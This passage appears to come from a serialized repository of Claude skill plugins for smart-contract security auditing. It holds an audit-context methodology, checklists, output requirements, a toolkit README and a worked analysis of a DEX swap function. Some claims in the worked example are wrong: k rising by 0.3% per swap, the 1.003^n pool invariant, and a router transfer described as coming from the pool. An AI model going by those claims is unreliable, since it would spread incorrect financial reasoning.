Events/messages.\n   - External interactions.\n\n4. **Block-by-Block / Line-by-Line Analysis**\n   For each logical block:\n   - What it does.\n   - Why it appears here (ordering logic).\n   - What assumptions it relies on.\n   - What invariants it establishes or maintains.\n   - What later logic depends on it.\n\n   Apply per-block:\n   - **First Principles**\n   - **5 Whys**\n   - **5 Hows**\n\n---\n\n### 5.2 Cross-Function & External Flow Analysis\n*(Full Integration of Jump-Into-External-Code Rule)*\n\nWhen encountering calls, **continue the same micro-first analysis across boundaries.**\n\n#### Internal Calls\n- Jump into the callee immediately.\n- Perform block-by-block analysis of relevant code.\n- Track flow of data, assumptions, and invariants:\n  caller  callee  return  caller.\n- Note if callee logic behaves differently in this specific call context.\n\n#### External Calls  Two Cases\n\n**Case A  External Call to a Contract Whose Code Exists in the Codebase**\nTreat as an internal call:\n- Jump into the target contract/function.\n- Continue block-by-block micro-analysis.\n- Propagate invariants and assumptions seamlessly.\n- Consider edge cases based on the *actual* code, not a black-box guess.\n\n**Case B  External Call Without Available Code (True External / Black Box)**\nAnalyze as adversarial:\n- Describe payload/value/gas or parameters sent.\n- Identify assumptions about the target.\n- Consider all outcomes:\n  - revert\n  - incorrect/strange return values\n  - unexpected state changes\n  - misbehavior\n  - reentrancy (if applicable)\n\n#### Continuity Rule\nTreat the entire call chain as **one continuous execution flow**.\nNever reset context.\nAll invariants, assumptions, and data dependencies must propagate across calls.\n\n---\n\n### 5.3 Complete Analysis Example\n\nSee [FUNCTION_MICRO_ANALYSIS_EXAMPLE.md](resources/FUNCTION_MICRO_ANALYSIS_EXAMPLE.md) for a complete walkthrough demonstrating:\n- Full micro-analysis of a DEX swap function\n- Application of First Principles, 5 Whys, and 5 Hows\n- Block-by-block analysis with invariants and assumptions\n- Cross-function dependency mapping\n- Risk analysis for external interactions\n\nThis example demonstrates the level of depth and structure required for all analyzed functions.\n\n---\n\n### 5.4 Output Requirements\n\nWhen performing ultra-granular analysis, Claude MUST structure output following the format defined in [OUTPUT_REQUIREMENTS.md](resources/OUTPUT_REQUIREMENTS.md).\n\nKey requirements:\n- **Purpose** (2-3 sentences minimum)\n- **Inputs & Assumptions** (all parameters, preconditions, trust assumptions)\n- **Outputs & Effects** (returns, state writes, external calls, events, postconditions)\n- **Block-by-Block Analysis** (What, Why here, Assumptions, First Principles/5 Whys/5 Hows)\n- **Cross-Function Dependencies** (internal calls, external calls with risk analysis, shared state)\n\nQuality thresholds:\n- Minimum 3 invariants per function\n- Minimum 5 assumptions documented\n- Minimum 3 risk considerations for external interactions\n- At least 1 First Principles application\n- At least 3 combined 5 Whys/5 Hows applications\n\n---\n\n### 5.5 Completeness Checklist\n\nBefore concluding micro-analysis of a function, verify against the [COMPLETENESS_CHECKLIST.md](resources/COMPLETENESS_CHECKLIST.md):\n\n- **Structural Completeness**: All required sections present (Purpose, Inputs, Outputs, Block-by-Block, Dependencies)\n- **Content Depth**: Minimum thresholds met (invariants, assumptions, risk analysis, First Principles)\n- **Continuity & Integration**: Cross-references, propagated assumptions, invariant couplings\n- **Anti-Hallucination**: Line number citations, no vague statements, evidence-based claims\n\nAnalysis is complete when all checklist items are satisfied and no unresolved \"unclear\" items remain.\n\n---\n\n## 6. Phase 3  Global System Understanding\n\nAfter sufficient micro-analysis:\n\n1. **State & Invariant Reconstruction**\n   - Map reads/writes of each state variable.\n   - Derive multi-function and multi-module invariants.\n\n2. **Workflow Reconstruction**\n   - Identify end-to-end flows (deposit, withdraw, lifecycle, upgrades).\n   - Track how state transforms across these flows.\n   - Record assumptions that persist across steps.\n\n3. **Trust Boundary Mapping**\n   - Actor  entrypoint  behavior.\n   - Identify untrusted input paths.\n   - Privilege changes and implicit role expectations.\n\n4. **Complexity & Fragility Clustering**\n   - Functions with many assumptions.\n   - High branching logic.\n   - Multi-step dependencies.\n   - Coupled state changes across modules.\n\nThese clusters help guide the vulnerability-hunting phase.\n\n---\n\n## 7. Stability & Consistency Rules\n*(Anti-Hallucination, Anti-Contradiction)*\n\nClaude must:\n\n- **Never reshape evidence to fit earlier assumptions.**\n  When contradicted:\n  - Update the model.\n  - State the correction explicitly.\n\n- **Periodically anchor key facts**\n  Summarize core:\n  - invariants\n  - state relationships\n  - actor roles\n  - workflows\n\n- **Avoid vague guesses**\n  Use:\n  - \"Unclear; need to inspect X.\"\n  instead of:\n  - \"It probably\"\n\n- **Cross-reference constantly**\n  Connect new insights to previous state, flows, and invariants to maintain global coherence.\n\n---\n\n## 8. Subagent Usage\n\nClaude may spawn subagents for:\n- Dense or complex functions.\n- Long data-flow or control-flow chains.\n- Cryptographic / mathematical logic.\n- Complex state machines.\n- Multi-module workflow reconstruction.\n\nSubagents must:\n- Follow the same micro-first rules.\n- Return summaries that Claude integrates into its global model.\n\n---\n\n## 9. Relationship to Other Phases\n\nThis skill runs **before**:\n- Vulnerability discovery\n- Classification / triage\n- Report writing\n- Impact modeling\n- Exploit reasoning\n\nIt exists solely to build:\n- Deep understanding\n- Stable context\n- System-level clarity\n\n---\n\n## 10. Non-Goals\n\nWhile active, Claude should NOT:\n- Identify vulnerabilities\n- Propose fixes\n- Generate proofs-of-concept\n- Model exploits\n- Assign severity or impact\n\nThis is **pure context building** only.\n",
        "plugins/audit-context-building/skills/audit-context-building/resources/COMPLETENESS_CHECKLIST.md": "# Completeness Checklist\n\nBefore concluding micro-analysis of a function, verify:\n\n---\n\n## Structural Completeness\n- [ ] Purpose section: 2+ sentences explaining function role\n- [ ] Inputs & Assumptions section: All parameters + implicit inputs documented\n- [ ] Outputs & Effects section: All returns, state writes, external calls, events\n- [ ] Block-by-Block Analysis: Every logical block analyzed (no gaps)\n- [ ] Cross-Function Dependencies: All calls and shared state documented\n\n---\n\n## Content Depth\n- [ ] Identified at least 3 invariants (what must always hold)\n- [ ] Documented at least 5 assumptions (what is assumed true)\n- [ ] Applied First Principles at least once\n- [ ] Applied 5 Whys or 5 Hows at least 3 times total\n- [ ] Risk analysis for all external interactions (reentrancy, malicious contracts, etc.)\n\n---\n\n## Continuity & Integration\n- [ ] Cross-reference with related functions (if internal calls exist, analyze callees)\n- [ ] Propagated assumptions from callers (if this function is called by others)\n- [ ] Identified invariant couplings (how this function's invariants relate to global system)\n- [ ] Tracked data flow across function boundaries (if applicable)\n\n---\n\n## Anti-Hallucination Verification\n- [ ] All claims reference specific line numbers (L45, L98-102, etc.)\n- [ ] No vague statements (\"probably\", \"might\", \"seems to\") - replaced with \"unclear; need to check X\"\n- [ ] Contradictions resolved (if earlier analysis conflicts with current findings, explicitly updated)\n- [ ] Evidence-based: Every invariant/assumption tied to actual code\n\n---\n\n## Completeness Signal\n\nAnalysis is complete when:\n1. All checklist items above are satisfied\n2. No remaining \"TODO: analyze X\" or \"unclear Y\" items\n3. Full call chain analyzed (for internal calls, jumped into and analyzed)\n4. All identified risks have mitigation analysis or acknowledged as unresolved\n",
        "plugins/audit-context-building/skills/audit-context-building/resources/FUNCTION_MICRO_ANALYSIS_EXAMPLE.md": "# Function Micro-Analysis Example\n\nThis example demonstrates a complete micro-analysis following the Per-Function Microstructure Checklist.\n\n---\n\n## Target: `swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 minAmountOut, uint256 deadline)` in Router.sol\n\n**Purpose:**\nEnables users to swap one token for another through a liquidity pool. Core trading operation in a DEX that:\n- Calculates output amount using constant product formula (x * y = k)\n- Deducts 0.3% protocol fee from input amount\n- Enforces user-specified slippage protection\n- Updates pool reserves to maintain AMM invariant\n- Prevents stale transactions via deadline check\n\nThis is a critical financial primitive affecting pool solvency, user fund safety, and protocol fee collection.\n\n---\n\n**Inputs & Assumptions:**\n\n*Parameters:*\n- `tokenIn` (address): Source token to swap from. Assumed untrusted (could be malicious ERC20).\n- `tokenOut` (address): Destination token to receive. Assumed untrusted.\n- `amountIn` (uint256): Amount of tokenIn to swap. User-specified, untrusted input.\n- `minAmountOut` (uint256): Minimum acceptable output. User-specified slippage tolerance.\n- `deadline` (uint256): Unix timestamp. Transaction must execute before this or revert.\n\n*Implicit Inputs:*\n- `msg.sender`: Transaction initiator. Assumed to have approved Router to spend amountIn of tokenIn.\n- `pairs[tokenIn][tokenOut]`: Storage mapping to pool address. Assumed populated during pool creation.\n- `reserves[pair]`: Pool's current token reserves. Assumed synchronized with actual pool balances.\n- `block.timestamp`: Current block time. Assumed honest (no validator manipulation considered here).\n\n*Preconditions:*\n- Pool exists for tokenIn/tokenOut pair (pairs[tokenIn][tokenOut] != address(0))\n- msg.sender has approved Router for at least amountIn of tokenIn\n- msg.sender balance of tokenIn >= amountIn\n- Pool has sufficient liquidity to output at least minAmountOut\n- block.timestamp <= deadline\n\n*Trust Assumptions:*\n- Pool contract correctly maintains reserves\n- ERC20 tokens follow standard behavior (return true on success, revert on failure)\n- No reentrancy from tokenIn/tokenOut during transfers (or handled by nonReentrant modifier)\n\n---\n\n**Outputs & Effects:**\n\n*Returns:*\n- Implicit: amountOut (not returned, but emitted in event)\n\n*State Writes:*\n- `reserves[pair].reserve0` and `reserves[pair].reserve1`: Updated to reflect post-swap balances\n- Pool token balances: Physical token transfers change actual balances\n\n*External Interactions:*\n- `IERC20(tokenIn).transferFrom(msg.sender, pair, amountIn)`: Pulls tokenIn from user to pool\n- `IERC20(tokenOut).transfer(msg.sender, amountOut)`: Sends tokenOut from pool to user\n\n*Events Emitted:*\n- `Swap(msg.sender, tokenIn, tokenOut, amountIn, amountOut, block.timestamp)`\n\n*Postconditions:*\n- `amountOut >= minAmountOut` (slippage protection enforced)\n- Pool reserves updated: `reserve0 * reserve1 >= k_before` (constant product maintained with fee)\n- User received exactly amountOut of tokenOut\n- Pool received exactly amountIn of tokenIn\n- Fee collected: `amountIn * 0.003` remains in pool as liquidity\n\n---\n\n**Block-by-Block Analysis:**\n\n```solidity\n// L90: Deadline validation (modifier: ensure(deadline))\nmodifier ensure(uint256 deadline) {\n    require(block.timestamp <= deadline, \"Expired\");\n    _;\n}\n```\n- **What:** Checks transaction hasn't expired based on user-provided deadline\n- **Why here:** First line of defense; fail fast before any state reads or computation\n- **Assumption:** `block.timestamp` is sufficiently honest (no 900-second manipulation considered)\n- **Depends on:** User setting reasonable deadline (e.g., block.timestamp + 300 seconds)\n- **First Principles:** Time-sensitive operations need expiration to prevent stale execution at unexpected prices\n- **5 Whys:**\n  - Why check deadline?  Prevent stale transactions\n  - Why are stale transactions bad?  Price may have moved significantly\n  - Why not just use slippage protection?  Slippage doesn't prevent execution hours later\n  - Why does timing matter?  Market conditions change, user intent expires\n  - Why user-provided vs fixed?  User decides their time tolerance based on urgency\n\n---\n\n```solidity\n// L92-94: Input validation\nrequire(amountIn > 0, \"Invalid input amount\");\nrequire(minAmountOut > 0, \"Invalid minimum output\");\nrequire(tokenIn != tokenOut, \"Identical tokens\");\n```\n- **What:** Validates basic input sanity (non-zero amounts, different tokens)\n- **Why here:** Second line of defense; cheap checks before expensive operations\n- **Assumption:** Zero amounts indicate user error, not intentional probe\n- **Invariant established:** `amountIn > 0 && minAmountOut > 0 && tokenIn != tokenOut`\n- **First Principles:** Fail fast on invalid input before consuming gas on computation/storage\n- **5 Hows:**\n  - How to ensure valid swap?  Check inputs meet minimum requirements\n  - How to check minimum requirements?  Test amounts > 0 and tokens differ\n  - How to handle violations?  Revert with descriptive error\n  - How to order checks?  Cheapest first (inequality checks before storage reads)\n  - How to communicate failure?  Require statements with clear messages\n\n---\n\n```solidity\n// L98-99: Pool resolution\naddress pair = pairs[tokenIn][tokenOut];\nrequire(pair != address(0), \"Pool does not exist\");\n```\n- **What:** Looks up liquidity pool address for token pair, validates existence\n- **Why here:** Must identify pool before reading reserves or executing transfers\n- **Assumption:** `pairs` mapping is correctly populated during pool creation; no race conditions\n- **Depends on:** Factory having called createPair(tokenIn, tokenOut) previously\n- **Invariant established:** `pair != 0x0` (valid pool address exists)\n- **Risk:** If pairs mapping is corrupted or pool address is incorrect, funds could be sent to wrong address\n\n---\n\n```solidity\n// L102-103: Reserve reads\n(uint112 reserveIn, uint112 reserveOut) = getReserves(pair, tokenIn, tokenOut);\nrequire(reserveIn > 0 && reserveOut > 0, \"Insufficient liquidity\");\n```\n- **What:** Reads current pool reserves for tokenIn and tokenOut, validates pool has liquidity\n- **Why here:** Need current reserves to calculate output amount; must confirm pool is operational\n- **Assumption:** `reserves[pair]` storage is synchronized with actual pool token balances\n- **Invariant established:** `reserveIn > 0 && reserveOut > 0` (pool is liquid)\n- **Depends on:** Sync mechanism keeping reserves accurate (called after transfers/swaps)\n- **5 Whys:**\n  - Why read reserves?  Need current pool state for price calculation\n  - Why must reserves be > 0?  Division by zero in formula if empty\n  - Why check liquidity here?  Cheaper to fail now than after transferFrom\n  - Why not just try the swap?  Better UX with specific error message\n  - Why trust reserves storage?  Alternative is querying balances (expensive)\n\n---\n\n```solidity\n// L108-109: Fee application\nuint256 amountInWithFee = amountIn * 997;\nuint256 numerator = amountInWithFee * reserveOut;\n```\n- **What:** Applies 0.3% protocol fee by multiplying amountIn by 997 (instead of deducting 3)\n- **Why here:** Fee must be applied before price calculation to affect output amount\n- **Assumption:** 997/1000 = 0.997 = (1 - 0.003) represents 0.3% fee deduction\n- **Invariant maintained:** `amountInWithFee = amountIn * 0.997` (3/1000 fee taken)\n- **First Principles:** Fees modify effective input, reducing output proportionally\n- **5 Whys:**\n  - Why multiply by 997?  Gas optimization: avoids separate subtraction step\n  - Why not amountIn * 0.997?  Solidity doesn't support floating point\n  - Why 0.3% fee?  Protocol parameter (Uniswap V2 standard, commonly copied)\n  - Why apply before calculation?  Fee reduces input amount, must affect price\n  - Why not apply after?  Would incorrectly calculate output at full amountIn\n\n---\n\n```solidity\n// L110-111: Output calculation (constant product formula)\nuint256 denominator = (reserveIn * 1000) + amountInWithFee;\nuint256 amountOut = numerator / denominator;\n```\n- **What:** Calculates output amount using AMM constant product formula: `y = (x * x_fee) / (y + x_fee)`\n- **Why here:** After fee application; core pricing logic of the AMM\n- **Assumption:** `k = reserveIn * reserveOut` is the invariant to maintain (with fee adding to k)\n- **Invariant formula:** `(reserveIn + amountIn) * (reserveOut - amountOut) >= reserveIn * reserveOut`\n- **First Principles:** Constant product AMM maintains `x * y = k` (with fee slightly increasing k)\n- **5 Whys:**\n  - Why this formula?  Constant product market maker (x * y = k)\n  - Why not linear pricing?  Would drain pool at constant price (exploitable)\n  - Why multiply reserveIn by 1000?  Match denominator scale with numerator (997 * 1000)\n  - Why divide?  Solving for y in: (x + x_fee) * (y - y) = k\n  - Why this maintains k?  New product = (reserveIn + amountIn*0.997) * (reserveOut - amountOut)  k * 1.003\n- **Mathematical verification:**\n  - Given: `k = reserveIn * reserveOut`\n  - New reserves: `reserveIn' = reserveIn + amountIn`, `reserveOut' = reserveOut - amountOut`\n  - With fee: `amountInWithFee = amountIn * 0.997`\n  - Solving `(reserveIn + amountIn) * (reserveOut - amountOut) = k`:\n    - `reserveOut - amountOut = k / (reserveIn + amountIn)`\n    - `amountOut = reserveOut - k / (reserveIn + amountIn)`\n    - Substituting and simplifying yields the formula above\n\n---\n\n```solidity\n// L115: Slippage protection enforcement\nrequire(amountOut >= minAmountOut, \"Slippage exceeded\");\n```\n- **What:** Validates calculated output meets user's minimum acceptable amount\n- **Why here:** After calculation, before any state changes or transfers (fail fast if insufficient)\n- **Assumption:** User calculated minAmountOut correctly based on acceptable slippage tolerance\n- **Invariant enforced:** `amountOut >= minAmountOut` (user-defined slippage limit)\n- **First Principles:** User must explicitly consent to price via slippage tolerance; prevents sandwich attacks\n- **5 Whys:**\n  - Why check minAmountOut?  Protect user from excessive slippage\n  - Why is slippage protection critical?  Prevents sandwich attacks and MEV extraction\n  - Why user-specified?  Different users have different risk tolerances\n  - Why fail here vs warn?  Financial safety: user should not receive less than intended\n  - Why before transfers?  Cheaper to revert now than after expensive external calls\n- **Attack scenario prevented:**\n  - Attacker front-runs with large buy  price increases\n  - Victim's swap would execute at worse price\n  - This check causes victim's transaction to revert instead\n  - Attacker cannot profit from sandwich\n\n---\n\n```solidity\n// L118: Input token transfer (pull pattern)\nIERC20(tokenIn).transferFrom(msg.sender, pair, amountIn);\n```\n- **What:** Pulls tokenIn from user to liquidity pool\n- **Why here:** After all validations pass; begins state-changing operations (point of no return)\n- **Assumption:** User has approved Router for at least amountIn; tokenIn is standard ERC20\n- **Depends on:** Prior approval: `tokenIn.approve(router, amountIn)` called by user\n- **Risk considerations:**\n  - If tokenIn is malicious: could revert (DoS), consume excessive gas, or attempt reentrancy\n  - If tokenIn has transfer fee: actual amount received < amountIn (breaks invariant)\n  - If tokenIn is pausable: could revert if paused\n  - Reentrancy: If tokenIn has callback, attacker could call Router again (mitigated by nonReentrant modifier)\n- **First Principles:** Pull pattern (transferFrom) is safer than users sending first (push) - Router controls timing\n- **5 Hows:**\n  - How to get tokenIn?  Pull from user via transferFrom\n  - How to ensure Router can pull?  User must have approved Router\n  - How to specify destination?  Send directly to pair (gas optimization: no router intermediate storage)\n  - How to handle failures?  transferFrom reverts on failure (ERC20 standard)\n  - How to prevent reentrancy?  nonReentrant modifier (assumed present)\n\n---\n\n```solidity\n// L122: Output token transfer (push pattern)\nIERC20(tokenOut).transfer(msg.sender, amountOut);\n```\n- **What:** Sends calculated amountOut of tokenOut from pool to user\n- **Why here:** After input transfer succeeds; completes the swap atomically\n- **Assumption:** Pool has at least amountOut of tokenOut; tokenOut is standard ERC20\n- **Invariant maintained:** User receives exact amountOut (no more, no less)\n- **Risk considerations:**\n  - If tokenOut is malicious: could revert (DoS), but user selected this token pair\n  - If tokenOut has transfer hook: could attempt reentrancy (mitigated by nonReentrant)\n  - If transfer fails: entire transaction reverts (atomic swap)\n- **CEI pattern:** Not strictly followed (Check-Effects-Interactions) - both transfers are interactions\n  - Typically Effects (reserve update) should precede Interactions (transfers)\n  - Here, transfers happen before reserve update (see next block)\n  - Justification: nonReentrant modifier prevents exploitation\n- **5 Whys:**\n  - Why transfer to msg.sender?  User initiated swap, they receive output\n  - Why not to an arbitrary recipient?  Simplicity; extensions can add recipient parameter\n  - Why this amount exactly?  amountOut calculated from constant product formula\n  - Why after input transfer?  Ensures atomicity: both succeed or both fail\n  - Why trust pool has balance?  Pool's job to maintain reserves; if insufficient, transfer reverts\n\n---\n\n```solidity\n// L125-126: Reserve synchronization\nreserves[pair].reserve0 = uint112(reserveIn + amountIn);\nreserves[pair].reserve1 = uint112(reserveOut - amountOut);\n```\n- **What:** Updates stored reserves to reflect post-swap balances\n- **Why here:** After transfers complete; brings storage in sync with actual balances\n- **Assumption:** No other operations have modified pool balances since reserves were read\n- **Invariant maintained:** `reserve0 * reserve1 >= k_before * 1.003` (constant product + fee)\n- **Casting risk:** `uint112` casting could truncate if reserves exceed 2^112 - 1 ( 5.2e33)\n  - For most tokens with 18 decimals: limit is ~5.2e15 tokens\n  - Overflow protection: require reserves fit in uint112, else revert\n- **5 Whys:**\n  - Why update reserves?  Storage must match actual balances for next swap\n  - Why after transfers?  Need to know final state before recording\n  - Why not query balances?  Gas optimization: storage update cheaper than CALL + BALANCE\n  - Why uint112?  Pack two reserves in one storage slot (256 bits = 2 * 112 + 32 for timestamp)\n  - Why this formula?  reserveIn increased by amountIn, reserveOut decreased by amountOut\n- **Invariant verification:**\n  - Before: `k_before = reserveIn * reserveOut`\n  - After: `k_after = (reserveIn + amountIn) * (reserveOut - amountOut)`\n  - With 0.3% fee: `k_after  k_before * 1.003` (fee adds permanent liquidity)\n\n---\n\n```solidity\n// L130: Event emission\nemit Swap(msg.sender, tokenIn, tokenOut, amountIn, amountOut, block.timestamp);\n```\n- **What:** Emits event logging swap details for off-chain indexing\n- **Why here:** After all state changes finalized; last operation before return\n- **Assumption:** Event watchers (subgraphs, dex aggregators) rely on this for tracking trades\n- **Data included:**\n  - `msg.sender`: Who initiated swap (for user trade history)\n  - `tokenIn/tokenOut`: Which pair was traded\n  - `amountIn/amountOut`: Exact amounts for price tracking\n  - `block.timestamp`: When trade occurred (for TWAP calculations, analytics)\n- **First Principles:** Events are write-only log for off-chain systems; don't affect on-chain state\n- **5 Hows:**\n  - How to notify off-chain?  Emit event (logs are cheaper than storage)\n  - How to structure event?  Include all relevant swap parameters\n  - How do indexers use this?  Build trade history, calculate volume, track prices\n  - How to ensure consistency?  Emit after state finalized (can't be front-run)\n  - How to query later?  Blockchain logs filtered by event signature + contract address\n\n---\n\n**Cross-Function Dependencies:**\n\n*Internal Calls:*\n- `getReserves(pair, tokenIn, tokenOut)`: Helper to read and order reserves based on token addresses\n  - Depends on: `reserves[pair]` storage being synchronized\n  - Returns: (reserveIn, reserveOut) in correct order for tokenIn/tokenOut\n\n*External Calls (Outbound):*\n- `IERC20(tokenIn).transferFrom(msg.sender, pair, amountIn)`: ERC20 standard call\n  - Assumes: tokenIn implements ERC20, user has approved Router\n  - Reentrancy risk: If tokenIn is malicious, could callback\n  - Failure: Reverts entire transaction\n- `IERC20(tokenOut).transfer(msg.sender, amountOut)`: ERC20 standard call\n  - Assumes: Pool has sufficient tokenOut balance\n  - Reentrancy risk: If tokenOut has hooks\n  - Failure: Reverts entire transaction\n\n*Called By:*\n- Users directly (external call)\n- Aggregators/routers (external call)\n- Multi-hop swap functions (internal call from same contract)\n\n*Shares State With:*\n- `addLiquidity()`: Modifies same reserves[pair], must maintain k invariant\n- `removeLiquidity()`: Modifies same reserves[pair]\n- `sync()`: Emergency function to force reserves sync with balances\n- `skim()`: Removes excess tokens beyond reserves\n\n*Invariant Coupling:*\n- **Global invariant:** `sum(all reserves[pair].reserve0 for all pairs) <= sum(all token balances in pools)`\n- **Per-pool invariant:** `reserves[pair].reserve0 * reserves[pair].reserve1 >= k_initial * (1.003^n)` where n = number of swaps\n  - Each swap increases k by 0.3% due to fee\n- **Reentrancy protection:** `nonReentrant` modifier ensures no cross-function reentrancy\n  - swap() cannot be re-entered while executing\n  - addLiquidity/removeLiquidity also cannot execute during swap\n\n*Assumptions Propagated to Callers:*\n- Caller must have approved Router to spend amountIn of tokenIn\n- Caller must set reasonable deadline (e.g., block.timestamp + 300 seconds)\n- Caller must calculate minAmountOut based on acceptable slippage (e.g., expectedOutput * 0.99 for 1%)\n- Caller assumes pair exists (or will handle \"Pool does not exist\" revert)\n",
        "plugins/audit-context-building/skills/audit-context-building/resources/OUTPUT_REQUIREMENTS.md": "# Output Requirements\n\nWhen performing ultra-granular analysis, Claude MUST structure output following the Per-Function Microstructure Checklist format demonstrated in [FUNCTION_MICRO_ANALYSIS_EXAMPLE.md](FUNCTION_MICRO_ANALYSIS_EXAMPLE.md).\n\n---\n\n## Required Structure\n\nFor EACH analyzed function, output MUST include:\n\n**1. Purpose** (mandatory)\n- Clear statement of function's role in the system\n- Impact on system state, security, or economics\n- Minimum 2-3 sentences\n\n**2. Inputs & Assumptions** (mandatory)\n- All parameters (explicit and implicit)\n- All preconditions\n- All trust assumptions\n- Each input must identify: type, source, trust level\n- Minimum 3 assumptions documented\n\n**3. Outputs & Effects** (mandatory)\n- Return values (or \"void\" if none)\n- All state writes\n- All external interactions\n- All events emitted\n- All postconditions\n- Minimum 3 effects documented\n\n**4. Block-by-Block Analysis** (mandatory)\nFor EACH logical code block, document:\n- **What:** What the block does (1 sentence)\n- **Why here:** Why this ordering/placement (1 sentence)\n- **Assumptions:** What must be true (1+ items)\n- **Depends on:** What prior state/logic this relies on\n- **First Principles / 5 Whys / 5 Hows:** Apply at least ONE per block\n\nMinimum standards:\n- Analyze at minimum: ALL conditional branches, ALL external calls, ALL state modifications\n- For complex blocks (>5 lines): Apply First Principles AND 5 Whys or 5 Hows\n- For simple blocks (<5 lines): Minimum What + Why here + 1 Assumption\n\n**5. Cross-Function Dependencies** (mandatory)\n- Internal calls made (list all)\n- External calls made (list all with risk analysis)\n- Functions that call this function\n- Shared state with other functions\n- Invariant couplings (how this function's invariants interact with others)\n- Minimum 3 dependency relationships documented\n\n---\n\n## Quality Thresholds\n\nA complete micro-analysis MUST identify:\n- Minimum 3 invariants (per function)\n- Minimum 5 assumptions (across all sections)\n- Minimum 3 risk considerations (especially for external interactions)\n- At least 1 application of First Principles\n- At least 3 applications of 5 Whys or 5 Hows (combined)\n\n---\n\n## Format Consistency\n\n- Use markdown headers: `**Section Name:**` for major sections\n- Use bullet points (`-`) for lists\n- Use code blocks (` ```solidity `) for code snippets\n- Reference line numbers: `L45`, `lines 98-102`\n- Separate blocks with `---` horizontal rules for readability\n",
        "plugins/building-secure-contracts/.claude-plugin/plugin.json": "{\n  \"name\": \"building-secure-contracts\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Comprehensive smart contract security toolkit based on Trail of Bits' Building Secure Contracts framework. Includes vulnerability scanners for 6 blockchains and 5 development guideline assistants.\",\n  \"author\": {\n    \"name\": \"Omar Inuwa\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/building-secure-contracts/README.md": "# Building Secure Contracts\n\nComprehensive smart contract security toolkit based on Trail of Bits' [Building Secure Contracts](https://github.com/crytic/building-secure-contracts) framework.\n\n**Author:** Omar Inuwa\n\n## Overview\n\nThis plugin provides 11 specialized skills for smart contract security across multiple blockchain platforms:\n\n- **6 Vulnerability Scanners** for platform-specific attack patterns\n- **5 Development Guidelines Assistants** for secure development practices\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/building-secure-contracts\n```\n\n---\n\n## Vulnerability Scanners\n\nPlatform-specific vulnerability detection based on Trail of Bits' [Not So Smart Contracts](https://github.com/crytic/not-so-smart-contracts) repository.\n\n### Algorand Vulnerability Scanner\n**Skill:** `/algorand-vulnerability-scanner`\n\nScans Algorand/TEAL codebases for 11 vulnerability patterns including:\n- Rekeying vulnerabilities\n- Unchecked transaction fees\n- Asset closing issues\n- Group size checks\n- Time-based replay attacks\n- And 6 more patterns\n\n### Cairo Vulnerability Scanner\n**Skill:** `/cairo-vulnerability-scanner`\n\nAnalyzes StarkNet/Cairo smart contracts for 6 vulnerability patterns:\n- Arithmetic overflow/underflow\n- Reentrancy\n- Uninitialized storage\n- Authorization bypass\n- And 2 more patterns\n\n### Cosmos Vulnerability Scanner\n**Skill:** `/cosmos-vulnerability-scanner`\n\nDetects security issues in Cosmos SDK modules for 9 patterns:\n- Undelegation time validation\n- Amount validation\n- Unbonding validation\n- Rounding issues\n- And 5 more patterns\n\n### Solana Vulnerability Scanner\n**Skill:** `/solana-vulnerability-scanner`\n\nScans Solana/Anchor programs for 6 critical vulnerabilities:\n- Arbitrary CPI\n- Improper PDA validation\n- Missing ownership checks\n- Signer authorization\n- And 2 more patterns\n\n### Substrate Vulnerability Scanner\n**Skill:** `/substrate-vulnerability-scanner`\n\nAnalyzes Substrate pallets for 7 security issues:\n- BadOrigin handling\n- Insufficient weight\n- Panics on overflow\n- Unsigned transaction validation\n- And 3 more patterns\n\n### TON Vulnerability Scanner\n**Skill:** `/ton-vulnerability-scanner`\n\nDetects vulnerabilities in TON smart contracts for 3 patterns:\n- Replay protection\n- Unprotected receiver\n- Sender validation issues\n\n---\n\n## Development Guidelines Assistants\n\nBased on Trail of Bits' [Development Guidelines](https://github.com/crytic/building-secure-contracts/tree/master/development-guidelines).\n\n### Audit Prep Assistant\n**Skill:** `/audit-prep-assistant`\n\nPrepare your codebase for security reviews with a comprehensive checklist:\n1. **Set review goals** - Define objectives and concerns\n2. **Resolve easy issues** - Run static analysis (Slither, dylint, golangci-lint)\n3. **Ensure accessibility** - Build instructions, frozen commits, scope clarity\n4. **Generate documentation** - Flowcharts, user stories, glossaries\n\n**Use this:** 1-2 weeks before your audit to maximize review effectiveness.\n\n### Code Maturity Assessor\n**Skill:** `/code-maturity-assessor`\n\nSystematic code maturity evaluation using Trail of Bits' 9-category framework:\n- Arithmetic safety\n- Auditing practices\n- Authentication/Access controls\n- Complexity management\n- Decentralization\n- Documentation quality\n- Transaction ordering risks\n- Low-level manipulation\n- Testing and verification\n\n**Output:** Professional maturity scorecard with evidence-based ratings and improvement roadmap.\n\n### Guidelines Advisor\n**Skill:** `/guidelines-advisor`\n\nComprehensive development best practices advisor covering:\n- **Documentation & Specifications** - Generate system descriptions and architectural diagrams\n- **Architecture Analysis** - Optimize on-chain/off-chain distribution\n- **Upgradeability Review** - Assess upgrade patterns and delegatecall proxies\n- **Implementation Quality** - Review functions, inheritance, events\n- **Common Pitfalls** - Identify security anti-patterns\n- **Dependencies** - Evaluate library usage\n- **Testing** - Suggest improvements\n\n**Use this:** Throughout development for architectural and implementation guidance.\n\n### Secure Workflow Guide\n**Skill:** `/secure-workflow-guide`\n\nInteractive 5-step secure development workflow:\n1. **Known Security Issues** - Run Slither with 70+ detectors\n2. **Special Features** - Check upgradeability, ERC conformance, token integration\n3. **Visual Inspection** - Generate inheritance graphs, function summaries, authorization maps\n4. **Security Properties** - Document properties, set up Echidna/Manticore\n5. **Manual Review** - Analyze privacy, front-running, cryptography, DeFi risks\n\n**Use this:** On every check-in or before deployment for continuous security validation.\n\n### Token Integration Analyzer\n**Skill:** `/token-integration-analyzer`\n\nComprehensive token security analysis for both implementations and integrations:\n- **ERC20/ERC721 Conformity** - Validate standard compliance\n- **Contract Composition** - Assess complexity and SafeMath usage\n- **Owner Privileges** - Review upgradeability, minting, pausability, blacklists\n- **20+ Weird Token Patterns** - Check for non-standard behaviors (missing returns, fee-on-transfer, rebasing, etc.)\n- **On-chain Analysis** - Query deployed contracts for scarcity and distribution\n- **Integration Safety** - Verify defensive patterns and safe transfer usage\n\n**Use this:** When building tokens or integrating with external tokens.\n\n---\n\n## Skill Organization\n\n```\nbuilding-secure-contracts/\n skills/\n     algorand-vulnerability-scanner/\n     audit-prep-assistant/\n     cairo-vulnerability-scanner/\n     code-maturity-assessor/\n     cosmos-vulnerability-scanner/\n     guidelines-advisor/\n     